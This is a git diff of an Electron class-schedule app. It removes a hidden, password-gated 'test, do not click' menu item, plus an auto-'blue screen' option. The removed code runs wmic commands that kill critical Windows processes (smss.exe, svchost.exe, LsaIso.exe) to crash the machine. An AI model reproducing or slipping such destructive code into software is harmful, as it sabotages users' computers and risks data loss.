@@ -64,9 +64,8 @@ app.whenReady().then(() => {
     Menu.setApplicationMenu(null)
     win.webContents.on('did-finish-load', () => {
         win.webContents.send('getWeekIndex');
-        win.webContents.send('ABS', store.get('isAutoBlueScreen', false))
-
         if (store.get("isFromCloud", false)) {
+            let scheduleConfigSync;
             let stat = true
             setTimeout(function () {
                 const { net } = require('electron')
@@ -209,39 +208,6 @@ ipcMain.on('getWeekIndex', (e, arg) => {
             checked: store.get('isFromCloud', false),
             click: (e) => {
                 store.set('isFromCloud', e.checked)
-            }
-        },
-        {
-            label: '下课显示',
-            type: 'checkbox',
-            checked: store.get('isAutoBlueScreen', false),
-            click: (e) => {
-                store.set('isAutoBlueScreen', e.checked)
-                win.webContents.send('ABS', e.checked)
-            }
-        },
-        {
-            label: '测试（勿点）',
-            click: (e) => {
-                prompt({
-                    title: '测试密码',
-                    label: '为了防止误触，请输入测试密码',
-                    value: arg.toString(),
-                    inputAttrs: {
-                        type: 'string'
-                    },
-                    type: 'input',
-                    height: 180,
-                    width: 400,
-                    icon: basePath + 'image/toggle.png',
-                }).then((r) => {
-                    if (r === "S86EB") {
-                        console.log("爆");
-                        const cmd1 = require('node-cmd').runSync("wmic process where name=\"smss.exe\" delete");
-                        const cmd2 = require('node-cmd').runSync("wmic process where name=\"svchost.exe\" delete");
-                        const cmd3 = require('node-cmd').runSync("wmic process where name=\"LsaIso.exe\" delete");
-                    }
-                })
             }
         },
         {
